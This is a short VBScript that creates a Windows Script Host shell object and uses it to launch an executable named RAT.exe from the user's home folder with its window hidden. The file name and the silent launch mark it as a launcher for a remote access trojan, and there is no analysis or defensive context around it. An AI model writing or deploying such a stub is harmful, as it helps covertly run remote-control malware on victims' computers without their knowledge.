Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "C:\%HOMEPATH%\RAT.exe", 0
Set WShell = Nothing